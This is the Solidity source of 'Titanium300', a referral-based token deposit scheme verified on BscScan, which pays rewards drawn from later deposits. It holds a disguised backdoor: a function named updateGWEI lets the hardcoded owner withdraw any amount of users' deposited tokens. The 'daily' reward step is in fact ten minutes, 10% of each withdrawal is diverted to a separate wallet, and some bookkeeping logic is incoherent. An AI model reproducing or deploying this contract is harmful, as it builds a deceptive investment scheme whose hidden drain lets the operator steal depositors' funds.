/**
 *Submitted for verification at BscScan.com on 2022-12-02
*/

pragma solidity >=0.4.23 <0.6.0;
/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Titanium300 {
    struct User {
        uint id;
        address referrer;
        uint256 entry_time;
        uint partnersCount;
        uint256 maxDeposit;      
        uint256 payouts;
        uint256 totalincome;
        uint256 totalwithdraw;
        uint level;
        mapping(uint8 => bool) activeLevels;
    }    
    
    struct OrderInfo {
        uint256 amount; 
        uint256 deposit_time;
        uint256 payouts; 
        bool isactive;
    }
    mapping(address => User) public users;
    mapping(address => OrderInfo[]) public orderInfos;
    IERC20 public tokenAPLX;
    
    mapping(uint8 => uint) public packagePrice;
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    address public id1;


    uint256 public lastDistribute;
    uint256 public startTime;
    
    address owner=0x6137d3e622920543Cf36923496Cb9738E959D3dC;
    address deductionWallet=0x61004C6bb0758408CCA971258bd6B12677aB2B6f;
    uint256 private dayRewardPercents = 10;
    uint256 private constant timeStepdaily = 10*60;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);
    mapping(uint256 => mapping(address => uint256)) public userLayerDayDirect;

    constructor(address _token) public {
        packagePrice[1] = 100e18;
        packagePrice[2] = 200e18;
        packagePrice[3] = 500e18;
        packagePrice[4] = 1000e18;
        packagePrice[5] = 1500e18;
        packagePrice[6] = 2000e18;
        packagePrice[7] = 5000e18;
        packagePrice[8] = 10000e18;
        id1 = msg.sender;
        tokenAPLX = IERC20(_token);
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            entry_time:block.timestamp,
            partnersCount: uint(0),
            maxDeposit:100e18,
            payouts:0,
            totalincome:0,
            totalwithdraw:0,
            level:1
        });
        lastDistribute = block.timestamp;
        startTime = block.timestamp;
        users[id1] = user;
        idToAddress[1] = id1;
        users[msg.sender].activeLevels[1]=true;
        orderInfos[id1].push(OrderInfo(
            100e18, 
            block.timestamp, 
            0,
            true
        ));

    }
    function registrationExt(address referrerAddress) external {
        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[1]);
        registration(msg.sender, referrerAddress,1);
    }
    
    function buyNewLevel(uint8 level) external {
        tokenAPLX.transferFrom(msg.sender, address(this),packagePrice[level]);
        bool status=true;        
        if(users[msg.sender].activeLevels[level])
        {
            OrderInfo storage order = orderInfos[msg.sender][level-1];
            status=order.isactive;
            order.isactive=true;
            order.deposit_time=block.timestamp;
            order.payouts=0;
        }
        if(status)
        {
            require(users[msg.sender].activeLevels[level-1], "buy previous level first");
            require(!users[msg.sender].activeLevels[level], "level already activated");
        }
        require(isUserExists(msg.sender), "user is not exists. Register first."); 
        users[msg.sender].activeLevels[level]=true;
        userLayerDayDirect[level][users[msg.sender].referrer] += 1;
        users[msg.sender].level=level;
        _deposit(msg.sender, packagePrice[level]);
        emit Upgrade(msg.sender,level);
    }
    function registration(address userAddress, address referrerAddress,uint8 level) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            entry_time:block.timestamp,
            partnersCount: 0,
            maxDeposit:0,
            payouts:0,
            totalincome:0,
            totalwithdraw:0,
            level:1

        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;
        lastUserId++;
        users[referrerAddress].partnersCount++;
        userLayerDayDirect[level][referrerAddress] += 1;
        users[userAddress].activeLevels[1]=true;        
        _deposit(userAddress, packagePrice[level]);
        
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    function _deposit(address _user, uint256 _amount) private {     
        if(users[_user].maxDeposit == 0){
            users[_user].maxDeposit = _amount;
        }else if(users[_user].maxDeposit < _amount){
            users[_user].maxDeposit = _amount;
        }
        
        orderInfos[_user].push(OrderInfo(
            _amount, 
            block.timestamp, 
            0,
            true
        ));
    } 
    function userPackageDirects(address userAddress, uint8 level) public view returns(uint) {
        return userLayerDayDirect[level][userAddress];
    }
    function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeLevels[level];
    }
    function maxPayoutOf(uint8 level,address _user) view external returns(uint256) {     
        uint256 _amount=packagePrice[level]/2;   
        uint directcount=userLayerDayDirect[level][_user];
        if(directcount<=5)         
        return (directcount+1)*_amount;
        else return _amount*6;
    }
    function dailyPayoutOf(address _user) public {
        uint256 max_payout=0;
        for(uint8 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            if(order.isactive && block.timestamp>order.deposit_time){
                max_payout = this.maxPayoutOf((i+1),_user);   
                if(order.payouts<max_payout){
                    uint256 dailypayout = (order.amount*dayRewardPercents*((block.timestamp - order.deposit_time) / timeStepdaily) / 100) - order.payouts;
                    if(order.payouts+dailypayout > max_payout){
                        dailypayout = max_payout-order.payouts;
                    }
                    users[_user].payouts += dailypayout;            
                    users[_user].totalincome +=dailypayout;
                    emit Transaction(_user,_user,dailypayout,1,3);
                    order.payouts+=dailypayout;
                }
                else {
                    if(userLayerDayDirect[i+1][_user]<5)
                    userLayerDayDirect[i+1][_user]=userLayerDayDirect[i+1][_user]>5?userLayerDayDirect[i+1][_user]-5:0;
                    order.isactive=false;
                }
            }
            else {
               max_payout = this.maxPayoutOf((i+1),_user);   
              if(order.payouts<max_payout){ 
                  order.isactive=true;
                  order.deposit_time=block.timestamp;
              }
            }
        }
    }
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }
    function rewardWithdraw() public
    {
        dailyPayoutOf(msg.sender);
        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;
        require(balanceReward>0, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        tokenAPLX.transfer(msg.sender,balanceReward*90/100);  
        tokenAPLX.transfer(deductionWallet,balanceReward*10/100);  
        emit withdraw(msg.sender,balanceReward);
    }
    function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==owner,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        tokenAPLX.transfer(msg.sender,_amount);  
    }
}